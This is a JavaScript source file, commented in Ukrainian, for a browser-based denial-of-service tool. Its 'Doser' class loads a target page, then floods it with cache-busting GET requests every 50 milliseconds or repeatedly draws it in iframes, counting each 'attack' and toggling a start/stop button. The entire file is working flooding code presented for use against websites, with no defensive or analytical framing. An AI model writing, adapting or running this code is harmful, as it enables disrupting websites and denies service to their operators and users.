const attackInterval = 200

// Функції для керування документом
function add_count () {
    attacks.text(parseInt(attacks.text()) + 1);
    (d => d.attacks ? d.attacks = parseInt(d.attacks) + 1 : d.attacks = 1)(Database)
}

function setTarget(target) {
	if (target) {
		targetField.text(target.page);
	    methodField.text("GET");
	    return true
	};
}


const composeVictim = async target => `${target.page}?data=${getRandomArbitrary()}`;


class Doser {
    async start(isFetch=true) {
    	this.attack = true; // Статус атаки

        // Запуск атаки

        btn.text("Стоп");
        const target = await getTarget();

        if (!setTarget(target)) {
        	// Якщо не завнтажились цілі

        	this.attack = false;
        	btn.text("Старт!");
        	return; // Стоп
        };
        console.log(target);

        this.interval = isFetch ? setInterval(async () => {
        	await fetch([await composeVictim(target)], {
	            method: "GET",
	            mode: 'no-cors',
				referrerPolicy: 'no-referrer',
				cache: 'no-cache',
				expires: 0
	        })
	        .catch(()=>{})

	        .then(() => {
	            // Після запиту
	            add_count();
	        })
        }, 50) : setInterval(async () => {
        	// Надсилання запиту на сайт за допомогою елементу iframe

        	await Frames.draw(target);

        	add_count();

        	if ($("#frames")[0].childElementCount >= 100) Frames.clear();
        }, attackInterval)
    };
    stop() {
    	if (this.interval) {
	    	this.attack = false;
	    	clearInterval(this.interval);
	    	Frames.clear();
	    	btn.text("Старт!")
    	}
    };
}